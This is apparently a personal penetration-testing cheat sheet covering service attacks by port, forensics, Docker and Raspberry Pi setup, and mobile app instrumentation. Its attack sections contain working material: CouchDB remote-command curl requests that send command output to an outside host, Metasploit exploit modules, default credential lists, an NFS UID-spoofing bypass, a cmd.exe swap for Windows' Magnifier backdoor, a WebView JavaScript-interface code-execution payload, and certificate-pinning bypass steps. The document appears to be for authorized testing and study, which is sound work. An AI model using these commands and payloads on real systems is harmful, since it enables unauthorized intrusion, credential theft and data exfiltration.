use exploit/windows/dcerpc/ms05_017_msmq			--> Windows 2000 ALL / Windows XP SP0-SP1 (English)
use exploit/windows/dcerpc/ms07_065_msmq			--> Windows 2000 Server English
-----------

-----------NFS -  Port(2049)
NFS --> TCP/UDP: 2049 --> Also uses RPCBIND: 111 to map the port & version
NFS v2 & v3: Only HOST, IP, MAC, DNS and USER protection
NFS v4: + Kereberos protection (able to authenticate individual users)
View mounted paths: 			showmount -e 172.18.1.XX
Mount: 							mount -o nolock -t nfs 172.18.1.XX:/nfs /mnt/nfs
Umount							umount -l /mnt/nfs
Scan(for shares and versions): 	nmap -p 111 --script rpcinfo,nfs-showmount 172.18.1.XX
Security: it's possible to break simple restrictions cloning HOST, IP, MAC, USER
	Also it's possible to break domain restriction if it's possible to ADD a line in the DNS server
	If v3 --> 	git clone https://github.com/bonsaiviking/NfSpy
		Usage: 	nfspy ./mnt -o server=172.18.1.XX:/export/downloads,hide,allow_other,ro,intr
Permission: it's possible to bypass its restrictions cloning the username and UID of the file owner.
	Example:	
		(Remote)	-rwxrrwx-- 517 wheel pepe file	
		(Local)		#useradd -u 5000 bob
		(Local)		#passwd bob
		(Local)		Edit /etc/passwd and change the UID to 517	
URLs: 
	Guidge: 	https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-security.html
	Examples: 	http://linux.die.net/man/5/exports
Ideas: In case of having a full root sharing host, (if it uses ssh with auth keys) it's possible to modify the .ssh to add another public key. :)
With Nfsshell you don't need to create users every time (to bypass v2 User protection)
# https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/
-----------

-----------Brico MSSQLserver		**check
http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/
http://blackburnmoonlit.blogspot.com.es/2012/07/hack-database-servers-with-sqlcmd-and.html
-----------

-----------Proxy Squid - Port(3128)
Configure the IP/port to try to have access to Internet (without creds)
-----------

-----------Detect a proxy
nmap --script=http-traceroute 119.81.x.x
-----------

-----------MYSQL - Port(3306)
NMAP:
	mysql-brute
	mysql-empty-password
	mysql-enum
	nmap --script mysql-info <host>
	mysql-query
Metasploit:
	auxiliary/scanner/mysql/mysql_version
-----------

-----------HP Vul - Port(5555)
# http://blog.opensecurityresearch.com/2012/08/manually-exploiting-hp-data-protector.html		--> manual exploit
# Insert the module  (data-prot3.rb) (stored on  Programas Auditoria) on the route: /opt/metasploit/apps/pro/msf3/modules/auxiliary/admin/hp
# Integrated on las msf exploit/multi/misc/hp_data_protector_exec_integutil
reload_all			--> on msfconsole
Metasploit:
	use auxiliary/admin/hp/data-prot3
-----------

-----------Nagios - Port(5666)
use exploit/linux/misc/nagios_nrpe_arguments
-----------

-----------CouchDB - RCE with admin account - Port(5984), Port(6984)
# More info: https://xianzhi.aliyun.com/forum/mobile/read/28.html
# CouchDB in the wild: https://blog.trendmicro.com/trendlabs-security-intelligence/vulnerabilities-apache-couchdb-open-door-monero-miners/
# It creates a new language, and then it triggers it. The result shoud be seen in an external server, like nc -lvvp 1420
curl -X PUT 'https://X.X.X.X:6984/_config/query_servers/cmd' -d '"/sbin/ifconfig | curl http://Y.Y.Y.Y:1420 -d @-"' -H 'Authorization: Basic <base64(username:pass)>' --insecure
curl -X PUT 'https://X.X.X.X:6984/vultest' -H 'Authorization: Basic <base64(username:pass)>' --insecure
curl -X PUT 'https://X.X.X.X:6984/vultest/vul' -d '{"_id":"770855a97726d5666d70a22173005c77"}' -H 'Authorization: Basic <base64(username:pass)>' --insecure
curl -X POST 'https://X.X.X.X:6984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Authorization: Basic <base64(username:pass)>' --insecure -H 'Content-Type: application/json'
-----------

-----------CouchDB - Port(5984), Port(6984)
https://X.X.X.X:6984/_utils				--> web access to the DDBB
use auxiliary/scanner/couchdb/couchdb_enum
use auxiliary/scanner/couchdb/couchdb_login
/usr/local/etc/couchdb/local.ini		--> where admins password are stored
-----------

-----------CouchDB docker test - Port(5984), Port(6984)
docker rm pepedocker
docker run --name pepedocker -p 5984:5984 -d couchdb
docker exec -it pepedocker /bin/bash							--> Control+P + Control+Q to detach the terminal
-----------

-----------WINRM (Windows Remote Management) - HTTP - Port(5985)
# https://community.rapid7.com/community/metasploit/blog/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit
use auxiliary/scanner/winrm/winrm_auth_methods
use auxiliary/scanner/winrm/winrm_login
-----------

-----------WMI (Windows Management Instrumentation) - Port(135)
# http://hackingandsecurity.blogspot.nl/2016/08/using-credentials-to-own-windows-boxes_99.html
# Execute commands:
wmic /node:<hostexample> /user:<DOMAINEXAMPLE>\<userexample> path win32_process call create "<commandexample>"  
-----------

-----------VNC - Port(5900)
nmap -sV -sC <target>
-----------

-----------Oracle Weblogic - Port(7001), Port(8001)
http://www.xxx.com:7001/console
http://www.xxx.com:8001/console
# -
Default credentials:
	weblogic:weblogic
	weblogic:welcome1
	weblogic:password
	system:weblogic
-----------

-----------Tomcat - Port(8080)
Metasploit:
use auxiliary/scanner/http/tomcat_mgr_login			--> check all the default users
use exploit/multi/http/tomcat_mgr_upload			--> upload the war, use the user/pass found with the tomcat_mgr_login command
# Default url: http://www.xxx.com/manager/html/
# Default users:
	tomcat:tomcat
	password:password
	admin:admin
	admin:password
	admin:<nopassword>
	tomcat:<nopassword>
-----------

-----------Jboss/WildFly - Port(8080), Port(9990)
http://hostname:8080/admin-console
http://hostname:8080/jmx-console
# - 
Default credentials:
	admin:admin
http://hostname:9990/console			--> (Jboss renamd to WildFly)
-----------

-----------WebSphere admin panel - Port(9043), Port(9443), Port(9060)
https://X.X.X.X:9043/ibm/console/logon.jsp
Then upload a war shell .jsp
# --
Default credentials:
	system
	wasadmin:wasadmin
-----------

-----------WebSphere object deserialization RCE - CVE-2015-7450 - Port(8603), Port(8878), Port(8880), Port(8881)
# IBM Websphere (8.5 and 8.5.5)
# You can see on https: <SOAP-ENV:Header ns0:WASRemoteRuntimeVersion="7.0.0.1v5" 
exploit/windows/misc/ibm_websphere_java_deserialize
exploit/linux/misc/jenkins_java_deserialize
-----------

=================================> <===


=================================>FORENSICS <===
-----------Forensics live distributions
Deft
Kali (Live forensics)
-----------

-----------Change Windows Password
cd /media/win/WINDOWS/system32/config/
chntpw -l SAM						--> view users
chntpw -u <username> SAM			--> clear user's password
-----------

-----------Change the magnifyer.exe for cmd.exe
Windows/System32/config/
mv Magnifyer.exe Magnifyer.old
cp cmd.exe Magnifyer.exe
-----------

-----------View Discs & Mount
sudo fdisk -l 						--> View the disks
mount 								--> Mounted filesystems 
mount /dev/sdb1 /media/pepe 		--> Mount the USB on /media/pepe/
-----------

-----------Copy Disk (we can copy the full "hda" disk or just the "hda1" partition)
dd if=/dev/hda bs=4096 conv=sync,noerror of=/media/pepe/file.img				--> normal copy without hash
--> or
dd if=/dev/hda bs=4096 conv=sync,noerror | tee file.img | md5sum > file.md5		--> copy and hash
-----------

-----------Mount a copied image (for doublecheck)
fdisk /opt/file.img		-> (p)											--> view the offset where starts the partition (unit in case of a disk)
mount -o ro,loop,offset=(offset*unit) /opt/file.img /mnt/particion		--> in case of a partition
--> or
mount -o ro,loop,offset=0 /opt/file.img /mnt/particion					--> in case of a disk
-----------

-----------First time mounted devices (USB)
C:\Windows\inf\setupapi.dev.log | grep "\- USB.VID" -C 10 --color
-----------

-----------RegRipper
install: https://linuxconfig.org/how-to-install-regripper-registry-data-extraction-tool-on-linux
rip -r <file> -f <file_type>		--> parse with all plugins
rip -l 								--> list all plugins
rip -r <file> -p <plugin>			--> parse specific plugin
Files:
	NTUSER
	NTUSER.DAT
	USRCLASS.DAT
	SAM
	Security
	SOFTWARE
	SYSTEM
-----------

-----------TImeline of file changes, etc.. (Autopsy from Kali)
fls -o 0 -f ntfs -m / -r /media/root/pepe/xxxxx.img > body.txt
mactime -b base.txt -d > timelinedisco.txt
-----------

-----------Strings of all the image with offsets
strings -o ./image.img												--> -o for the offset
dd if=file.img of=part.img bs=512 skip=63 count=2056257 			--> skip=offset/512   	count=the size of the window to store
-----------

-----------Firefox cache
/Users/xxxxxxx/AppData/Local/Mozilla/Firefox/Profiles/5fds8eh7.default/cache2/entries
-----------

-----------Chrome cache
sqlite3 /Users/xxxxxxx/AppData/Local/Google/Chrome/User Data/Default/History
-----------

-----------Lime - get the memory (Linux)
Install:
	git clone https://github.com/504ensicslabs/lime
	cd lime/
	cd src/
	make
Use:(in path lime/src/)
	insmod lime-3.16.0-55-generic.ko "path=/media/pepe/KINGSTON/mmry.lime format=lime"
-----------

-----------Create Volatility Profile (Linux)
apt-get install dwarfdump 						--> it might be necessary
wget http://downloads.volatilityfoundation.org/releases/2.5/volatility-2.5.zip
unzip volatility-2.5.zip
cd volatility-2.5/volatility-master/tools/linux
sudo zip /media/pepe/KINGSTON/Ubuntu1204.zip volatility-2.5/volatility-master/tools/linux/module.dwarf /boot/System.map-3.2.0-23-generic
-----------

-----------Analize memory (Volatility) with the created profile (Linux)			--> unluckly NOT working :(
vol.py --plugins=/media/pepe/KINGSTON/ --info | grep Profile 				--> to view the <profile name>
vol.py --plugins=/media/pepe/KINGSTON/ --profile=Linuxubuntux64 linux_mount -f /media/pepe/KINGSTON/mmry.lime
-----------

-----------Get the Memory - (Windows)
Download and execute it from an USB drive 
	https://belkasoft.com/download/ram/RamCapturer64.zip
-----------

-----------Volatility - Analize memory from (Windows)
install: 
	sudo apt-get install volatility
usage:
	volatility imageinfo -f imagenCreada.mem
	volatility hivelist -f /ruta/volcado.mem  --profile=Win7SP1x64					--> system registers
	volatility pslist -f /ruta/volcado.mem --profile=Win7SP1x64 					--> active process
	volatility svcscan -f /ruta/volcado.mem  --profile=Win7SP1x64 					--> active services
	volatility ldrmodules -f /ruta/volcado.mem  --profile=Win7SP1x64 				--> used services/dlls
	volatility hashdump -f /ruta/volcado.mem   --profile=Win7SP1x64 --sys-offset 0xfffff8a000024010  --sam-offset 0xfffff8a005bfc019	
			--> offsets del hivelist (SYSTEM y SAM)
-----------

-----------Get Memory (VMWare)
It's stored in .vmem file
-----------

-----------Get memory (VirtualBox)
# Execute it while the machine is running:
vboxmanage debugvm "Win7" dumpguestcore --filename test.elf
objdump -h test.elf|egrep -w "(Idx|load1)"
	Idx Name          Size      VMA               LMA               File off  Algn
	1 load1         40000000  0000000000000000  0000000000000000  00000720  2**0
size=0x40000000;off=0x720;head -c $(($size+$off)) test.elf|tail -c +$(($off+1)) > test.raw
-----------

-----------Forensic links
https://diuf.unifr.ch/drupal/tns/sites/diuf.unifr.ch.drupal.tns/files/cmarko-tskintro.pdf
http://forensicswiki.org/wiki/Google_Chrome#Cookies	
http://rationallyparanoid.com/articles/sleuth-kit.html
https://digital-forensics.sans.org/blog/2011/12/21/digital-forensic-sifting-string-searching-and-file-carving-using-srch-strings-wrap
-----------

-----------Accessed files by a process
lsof -n -p `pidof your_app`
-----------

-----------Processes that access to a file
lsof -n -t file
-----------

-----------AWS forensics
# https://medium.com/@cloudyforensics/how-to-perform-aws-cloud-forensics-309a03a77aee
-----------

-----------Windows activity history - Windows 10
# https://www.flu-project.com/2019/06/recuperando-historial-actividades-Windows-10.html
### Check it with SQLite Viewer:
%APPDATA%\ConnectedDevicesPlatform\AAD.xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\ActivitivitiesCache.db
-----------
=================================><===


=================================>INCIDENT RESPONSE<===
-----------Incident Reponse Resources
# https://github.com/meirwah/awesome-incident-response
-----------

-----------LiMEaide - remote memory dump (linux)
# https://github.com/kd8bny/LiMEaide
# Remote memroy dump and volatility profiling for linux machines
-----------

-----------SANS DFIR poster
# https://www.sans.org/security-resources/posters/windows-forensic-analysis/170/download
-----------

-----------Wireshark plugin to summarize information HTTP, HTTPS, etc.
# https://github.com/pentesteracademy/patoolkit
-----------
=================================><===


=================================>DOCKER <===
-----------Install Docker-CE in Kali
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list
apt-get update
apt-get remove docker docker-engine docker.io
apt-get install docker-ce
-----------

-----------Install Docker Community in AWS
# http://docs.aws.amazon.com/AmazonECS/latest/developerguide/docker-basics.html
sudo yum update -y
sudo yum install -y docker
sudo service docker start
sudo usermod -a -G docker ec2-user
docker info
-----------

-----------Images repository
https://hub.docker.com/
-----------

-----------Download image
docker pull sonarqube
-----------

-----------Docker info (view path executed)
docker info
-----------

-----------View Images
docker images
-----------

-----------View containers
docker ps
docker ps -a				--> (view all containers, also stoped ones)
-----------

-----------Stats
docker stats
-----------

-----------Remove imagen
docker rmi <IMAGE ID>
-----------

-----------Run a container
docker run -t -i kalilinux/kali-linux-docker /bin/bash					--> -t -i for interactive+terminal mode
-----------

-----------Detach containers (from the terminal)
CONTROL+P + CONTROL+Q
-----------

-----------Attach to a container
docker attach <CONTAINER ID>
-----------

-----------Create a persistent volume
docker create -v /tmp --name datacontainer ubuntu
docker run -it --volumes-from datacontainer ubuntu /bin/bash
-----------

-----------Sharing volumes with host 
# /data is in the container, and it will be removed
docker run -it --name prueba1 -v /home/pepe/Escritorio/dockers:/data kalilinux/kali-linux-docker /bin/bash
-----------

-----------Sharing volumes with other containers
docker run -it --name prueba1 --volumes-from <CONTAINER_NAME> kalilinux/kali-linux-docker /bin/bash
-----------

-----------Remove all stoped containers
docker rm $(docker ps -a -q)
-----------

-----------Login docker
docker login
-----------

-----------Make a push
docker tag myImage myRegistry.com/myImage
docker push myRegistry.com/myImage
-----------

-----------Commit (to modify an image)
docker commit -m "Added json gem" -a "Kate Smith" 0b2616b0e5a8 raspberrypi.local:5000/sinatra:v2
-----------

-----------Execute a command
docker exec -it 3ea65d25a476 ls -lrtha
-----------

-----------Dockerfile
FROM xxxxx/prueba:v2
MAINTAINER Pepe
RUN ls -lrtha 
-----------

-----------Build
docker build -t <name_new_image> .
-----------

-----------View images of the repo
https://raspberrypi.local:5000/v2/_catalog
-----------

-----------View tags of the repo
https://raspberrypi.local:5000/v2/<name>/tags/list
-----------

-----------Network: same as the host
docker run --net=host corfr/tcpdump
-----------

-----------Docker Security Images
docker pull remnux/metasploit 				--> docker-metasploit
docker pull paoloo/sqlmap					--> docker-sqlmap
docker pull kalilinux/kali-linux-docker		--> official Kali Linux
docker pull wpscanteam/wpscan 				--> official WPScan
-----------
=================================><===


=================================>RASPBERRY PI - DOCKER <===
-----------Quick setup raspberry:
sudo apt-get install -y pv curl python-pip unzip
sudo pip install awscli
git clone https://github.com/hypriot/flash; cd flash
./flash https://downloads.raspberrypi.org/raspbian_lite_latest
ssh pi@raspberrypi.local
-----------

-----------Install hostapd and DHCP
https://frillip.com/using-your-raspberry-pi-3-as-a-wifi-access-point-with-hostapd/
-----------

-----------Create an Access Point
# URL:https://frillip.com/using-your-raspberry-pi-3-as-a-wifi-access-point-with-hostapd/
# Follow this manual to connect with the raspi, check the website if you also wanna forward the eth0

sudo apt-get install hostapd
sudo apt-get install dnsmasq

sudo vim /etc/dhcpcd.conf
	##MODIFY:
	interface wlan0  
    static ip_address=172.24.1.X1/24
		
sudo vim /etc/network/interfaces
	##MODIFY:
	allow-hotplug wlan0  
	iface wlan0 inet manual  
	#wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf

vim /etc/hostapd/hostapd.conf
	###ADD:
	# This is the name of the WiFi interface we configured above
	interface=wlan0
	# Use the nl80211 driver with the brcmfmac driver
	driver=nl80211
	# This is the name of the network
	ssid=Pi3-AP
	# Use the 2.4GHz band
	hw_mode=g
	# Use channel 6
	channel=6
	# Enable 802.11n
	ieee80211n=1
	# Enable WMM
	wmm_enabled=1
	# Enable 40MHz channels with 20ns guard interval
	ht_capab=[HT40][SHORT-GI-20][DSSS_CCK-40]
	# Accept all MAC addresses
	macaddr_acl=0
	# Use WPA authentication
	auth_algs=1
	# Require clients to know the network name
	ignore_broadcast_ssid=0
	# Use WPA2
	wpa=2
	# Use a pre-shared key
	wpa_key_mgmt=WPA-PSK
	# The network passphrase
	wpa_passphrase=raspberry
	# Use AES, instead of TKIP
	rsn_pairwise=CCMP

sudo vim /etc/default/hostapd
	###MODIFY:
	DAEMON_CONF="/etc/hostapd/hostapd.conf"
	
sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
sudo vim /etc/dnsmasq.conf
	###ADD:
	interface=wlan0      # Use interface wlan0  
	bind-interfaces      # Bind to the interface to make sure we aren't sending things elsewhere  
    server=8.8.8.X8       # Forward DNS requests to Google DNS  
	domain-needed        # Don't forward short names  
	bogus-priv           # Never forward addresses in the non-routed address spaces.  
    dhcp-range=172.24.1.X50,172.24.1.X150,12h # Assign IP addresses between 172.24.1.X50 and 172.24.1.X150 with a 12 hour lease time  

sudo service hostapd start  
sudo service dnsmasq start  
-----------

-----------With port forwarding
sudo nano /etc/sysctl.conf
	Uncomment --> net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT  
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT  
sudo sh -c "iptables-save > /etc/iptables.ipv4.nat"
sudo nano /lib/dhcpcd/dhcpcd-hooks/70-ipv4-nat
	Add --> iptables-restore < /etc/iptables.ipv4.nat  
-----------


-----------Install docker (hypriot) in the Raspberry Pi
ssh pi@raspberrypi.local
sudo apt-get install -y apt-transport-https
wget -q https://packagecloud.io/gpg.key -O - | sudo apt-key add -
echo 'deb https://packagecloud.io/Hypriot/Schatzkiste/debian/ wheezy main' | sudo tee /etc/apt/sources.list.d/hypriot.list
sudo apt-get update
sudo apt-get install -y docker-hypriot
sudo systemctl enable docker
-----------

-----------Add a user to the "docker" group
sudo gpasswd -a ${USER} docker
-----------

-----------Pull private Registry-ARM
docker pull vdavy/registry-arm
-----------

-----------Run private registry container
docker run -d -p 5000:5000 --restart=always vdavy/registry-arm
-----------

-----------Create a certificate and a key for the private repository
mkdir registry_certs
openssl req -newkey rsa:4096 -nodes -sha256 -keyout registry_certs/domain.key -x509 -days 365 -out registry_certs/domain.crt
-----------

-----------Run the private registry container (with the certificates and private key)
docker run -d -p 5000:5000 -v $PWD/registry_certs:/certs -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/domain.crt -e REGISTRY_HTTP_TLS_KEY=/certs/domain.key --restart=always vdavy/registry-arm
-----------

-----------Copy the certificats in the client
cp ca.crt /etc/docker/certs.d/raspberrypi.local:5000/ca.crt
-----------

-----------Recommended book for certificates, ...
https://books.google.es/books?id=wpYpCwAAQBAJ&pg=PA106&lpg=PA106&dq=Error+response+from+daemon:+Get+https:/:5000/v1/_ping:+tls:+oversized+record+received+with+length&source=bl&ots=QfK8tLk
SeP&sig=e5Ik5O_2973xDSwd7-Of_Db_Gv4&hl=es&sa=X&ved=0ahUKEwjh66Py3vjMAhXJORoKHR8DCbgQ6AEIajAJ#v=onepage&q=Error%20response%20from%20daemon%3A%20Get
%20https%3A%2F%3A5000%2Fv1%2F_ping%3A%20tls%3A%20oversized%20record%20received%20with%20length&f=false
-----------

-----------Packages
RPI-NMAP
https://github.com/slaash/scripts/blob/master/dock/nmap/Dockerfile
-----------

-----------Docker default routes
sudo ip route add 172.17.0.X0/16 dev docker0 proto kernel scope link src 172.17.0.X1
sudo ip route del 172.17.0.X0/16 dev docker0
-----------

=================================><===


=================================>MOBILE <===
-----------Mobile Top vulnerabilites
1- Improper Platform Usage (OWASP Top 10)
2- Insecure Data Storage
3- Insecure Communication
4- Insecure Authentication
5- Insufficient Cryptography
6- Insecure Authorization
7- Client Code Quality
8- Code Tampering
9- Reverse Engineering
10- Extraneaous Functions
-----------

-----------TOOLS - (Android)
Disassembling = DEX -> Smali	(Apktool)
Decompiling = DEX -> JAR		(Dex2jar)
View JAR						(JD-GUI)
Frida 				--> View system calls on execution time, so it's possible to modify them. Inject calls.
SSL Kill Switch 	--> patches the specific SSL low-level functions to override the system/custom (pinning) certificate validation
MobSF				--> Static and dynamic analysis framework. (don't need a real phone)
-----------

-----------MobSF on docker
# https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-documentation
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
-----------

-----------Decompiling APK
#DEX -> JAR
# dex2jar alternative:
# https://github.com/google/enjarify
python3 -O -m enjarify.main yourapp.apk
-----------

-----------Apktools basics
# Decompiling
apktool d app.apk
# Recompiling
apktol b app.apk
-----------

-----------Certificate pinning
apktool d app.apk				--> decompile the app
# Export Burp cert in DER format
mv cert.der originalcert.cer	--> replace the original cert of the app
apktool b app.apk				--> recompile the app again
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000		--> generate key to sign it
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore app.apk alias_name				--> sign it
-----------

-----------Self-sign the application (.apk)
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000		--> generate key to sign it
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore app.apk alias_name				--> sign it
-----------

-----------Protection methods
Certificate Pinning = OpenSSL or check hash of the certificate
Proguard -> Optimizer + ofuscator
Antiroot -> Check for files of cydia or jailbreak
Well protected App = Proguard + Certificate Pinning + Antiroot 
-----------

-----------Routes - (iOS)
/var/mobile/Containers/Bundle/Application/FF80CA2C
/prod
/User/Library/Caches
-----------

-----------Routes - (Android)
/data/data			--> Applications sandbox folder
/data/local/tmp		--> temporal folder
-----------

-----------View logs (Android)
adb logcat
-----------

-----------Shell through USB (Android)
adb shell
-----------

-----------Push file (Android)
adb push <file> /data/local/tmp
-----------

-----------Pull file (Android)
adb pull /data/local/tmp/file <file>
-----------

-----------Plists - (iOS)
plutil -show Info.plist
-----------

-----------Frida example to bypass a passcode protection - (iOS)
# http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html?m=1
-----------

-----------Objection - powered by Frida
# https://github.com/sensepost/objection
# objection is a runtime mobile exploration toolkit, powered by Frida. 
# It was built with the aim of helping assess mobile applications and their security posture without the need for a jailbroken or rooted mobile device.
### Install:
# Requires python3
pip3 install -U objection

### Run:
# run frida-server
ssh -L 27042:127.0.0.1:27042 root@192.168.0.8
objection -N -g "Calendar" explore

### Commands:
ios jailbreak disable
ios sslpinning diable
ios cookies get
ios hooking search classes <example>
ios hooking watch class <example>
android keystore dump
-----------

-----------Intent for messaging between applications - (Android)
private void sendDataToApp(String msg) {
       Intent intent = new Intent("com.xxxx.app.DATA");
       intent.putExtra("MESSAGE", msg);
       Context.sendBroadcast(intent);
   }
# Vulnerability cause it sends the message on broadcast, so another app could intercept them
-----------

-----------WebViewGUI vulnerability RCE - (Android)
public class WebViewGUI extends Activity {
 
 WebView mWebView;
 public void onCreate(Bundle savedInstanceState) {
   super.onCreate(savedInstanceState);
   mWebView=new WebView(this);
   mWebView.getSettings().setJavaScriptEnabled(true);
   mWebView.addJavascriptInterface(new JavaScriptInterface(), "jsinterface");
   mWebView.loadUrl("http://www.xxxxxx.com");
   setContentView(mWebView);
 }
 
 final class JavaScriptInterface {
   JavaScriptInterface () { }
   public String getSomeString() {
     return "string";
   }
 }
}

# The vulnerability here is that the jsinterface is exposed for Javascript, so it could be called from a script of the website like a stored XSS on the website or a MitM on the network as the website is http to finally execute remote commands.
# Example:
<script>
function execute(cmd){
  return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
-----------

-----------Identify APKs protections, obfuscation... - (Android)
# http://seclist.us/apkid-android-applications-identifier-for-packer-protectors-obfuscator-and-oddities.html
-----------

-----------Cordova security plugins
# Secure storage protection
https://github.com/Crypho/cordova-plugin-secure-storage
# Encryption of the sourcecode (usually .js, .html)
https://github.com/tkyaji/cordova-plugin-crypt-file
-----------

-----------Decrypt sourcecode - cordova-plugin-crypt-file (tkyaji)
# http://blog.rz.my/2017/11/decrypting-cordova-crypt-file-plugin.html
The example from the website doesn't work, so I simplified the code.
With openssl I go some errors to, probably due to the encoding format UTF-8.
# To run it: node nameofthescript.js filetodecrypt.html
var fs      =   require("fs"),
    path    =   require("path"),
    crypto  =   require("crypto");

var config = {
	key : 'Kn2dixxxxxxxxxQdcc/9LXzos/xxxx',
	iv  : 'XxxxgQ+8xxxcwJb9'
}

file = process.argv[2];
//console.log("Start");
var content = fs.readFileSync(file, 'utf-8');
contentt = Buffer.from(content, 'base64').toString('binary');
var decry = Decrypt(contentt, config.key, config.iv);
console.log(decry);

function Decrypt(Input, Key, Iv) {
    var cipher = crypto.createDecipheriv('aes-256-cbc', Key, Iv);
    var decrypted = cipher.update(Input, 'binary', 'utf-8');
    decrypted + cipher.final('utf8');
    return decrypted;
}
# Bonus: to run it in all the files
find ./ | grep -iE "\.js|\.html|\.json" | while read line; do install -DTm644 /dev/null ../temp/$line; node node_decypt.nj $line > ../temp/$line; done
-----------

-----------Cloak & Dagger Attack - Similar to clickjacking (Android)
# http://resources.infosecinstitute.com/understanding-cloak-dagger-attack-overview-tutorial/
-----------

-----------Frida, setup & run server (rooted device) (iOS)
# https://techblog.mediaservice.net/2018/04/brida-a-step-by-step-user-guide/
### Host: (get and upload frida-server to the rooted device)
wget https://github.com/frida/frida/releases/download/12.2.18/frida-server-12.2.18-ios-arm64.xz
unxz frida-server-12.2.18-ios-arm64.xz
scp frida-server-12.2.18-ios-arm64 root@192.168.0.8:/var/root

### iOS:
./frida-server-10.8.2-android-arm
# In somecases (depending on jailbreak) is needed: cp frida-server-10.8.2-android-arm /usr/sbin/frida-server; /usr/sbin/frida-server

### Host: (test with USB connection)
pip install frida-tools
pip install frida
firda-ps -U

### Host: (test with remote connection)
pip install frida
ssh -L 27042:127.0.0.1:27042 root@192.168.0.8
frida-ps -R

### iOS: (test with remote connection 2)
./frida-server-10.8.2-android-arm -l 0.0.0.0

### Host: (test with remote connection 2)
pip install frida
frida-ps -H 192.168.0.8
-----------

-----------Frida, setup & run server (rooted device) (Android)
### Host: (get and upload frida-server to the rooted device)
wget https://github.com/frida/frida/releases/download/12.2.6/frida-server-12.2.6-android-arm64.xz
unxz frida-server-12.2.6-android-arm64.xz
adb push frida-server-12.2.6-android-arm64 /data/local/tmp

### Android: run the server (through USB adb)
adb shell
su
cd /data/local/tmp
./frida-server-12.2.6-android-arm64

### Host: connect to Frida (through USB)
pip install frida-tools
pip install frida
frida-ps -U
-----------

-----------Brida configuration
### Host: (install Brida)
# https://github.com/federicodotta/Brida/releases
pip install pyro4
# Add Extension in Burp

### Host: (configure Brida)
# Add the Frida js file: scriptBrida.js
# Add the name of the app
find /private/var/mobile/Containers/Data/Application/ | grep <appname>			--> iOS
# Select Frida Remote/Local depending on the connection with the device
-----------

-----------Frida, inject gadget in .APK (not rooted device) (Android) 
# https://koz.io/using-frida-on-android-without-root/
### Host: (inject frida-gadget in the APP) - Android
apktool d -o out_dir original.apk
wget https://github.com/frida/frida/releases/download/9.1.26/frida-gadget-<correct_version_XXX>.so.xz
unxz frida-gadget-<correct_version_XXX>.so.xz
cp frida_libs/armeabi/frida-gadget-9.1.26-android-arm.so out_dir/lib/armeabi/libfrida-gadget.so
# Load the library of the gadget from the main application Activity for example (System.loadLibrary("frida-gadget"))
# Add the next Smali code:
const-string v0, "frida-gadget"
invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
# Modify the manifest to enable sockets, add:
<uses-permission android:name="android.permission.INTERNET" />
# Repackage the application:
apktool b -o repackaged.apk out_dir/
# Sign the application:
keytool -genkey -v -keystore custom.keystore -alias mykeyaliasname -keyalg RSA -keysize 2048 -validity 10000
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore mycustom.keystore -storepass mystorepass repackaged.apk mykeyaliasname
jarsigner -verify repackaged.apk
zipalign 4 repackaged.apk repackaged-final.apk
-----------

-----------Applesign for re-signing iOS Apps (iOS)
# git clone https://github.com/nowsecure/node-applesign
# Dependencies zip, unzip, codesign, security
npm install
-----------

-----------Frida, inject gadget in .IPA with applesign (not jalbreaked device) (iOS)
# https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/
# https://www.slideshare.net/abrahamaranguren/pwning-mobile-apps-without-root-or-jailbreak-136622746
# Get a developer account
# Install XCode
# Create a test project 
# In the general settings add the developer account, add a iOS Developer certificate and select the Team to sign the App
# Build the project with the selected signature and locate the "embedded.mobileprovision" inside the .app
security find-identity -v -p codesigning			--> get the hash of the identity 
bin/applesign.js -i AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -m /Users/xxx/Library/Developer/Xcode/DerivedData/testt-enhimopwzhxhgebfyooccsfdpihg/Build/Prod
ucts/Debug-iphoneos/testt.app/embedded.mobileprovision ./XXX.ipa --output XXX-ReSigned.ipa -I frida-gadget-12.2.6-ios-universal.dylib
ios-deploy --bundle Payload/XXX.app/ -d -W
frida -U Gadget		--> Connected by USB
objection explore	--> or use Objection
# DeviceSupport for the specific device version (iOS 11) might be needed to autorun the application in the device and avoid frida gadget crash
# https://stackoverflow.com/questions/50633023/device-support-files-for-ios-11-4-15f79
-----------

-----------Frida, inject gadget in .IPA with objection (not jailbreaked device) (iOS)
# https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/
# Get a developer account
# Install XCode
# Create a test project 
# In the general settings add the developer account, add a iOS Developer certificate and select the Team to sign the App
security find-identity -v -p codesigning			--> get the hash of the identity
